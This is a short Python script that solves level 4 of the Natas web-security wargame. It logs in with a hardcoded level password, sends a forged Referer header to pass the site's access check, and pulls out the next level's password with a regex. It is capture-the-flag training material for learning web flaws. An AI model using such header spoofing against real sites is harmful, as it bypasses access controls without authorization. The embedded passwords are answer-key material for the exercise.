#!/usr/bin/env python

import requests
import re

print("Natas Level 4")

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

url = "http://%s.natas.labs.overthewire.org/"%(username)

headers = {
	"Referer" : "http://natas5.natas.labs.overthewire.org/"
}

with requests.session() as session:
	response = session.get(url, auth = (username, password), headers = headers)

	# print(response.headers)

	content = response.text 

	# print( content)

	print( re.findall("Access granted. The password for natas5 is (.*)", content)[0] )

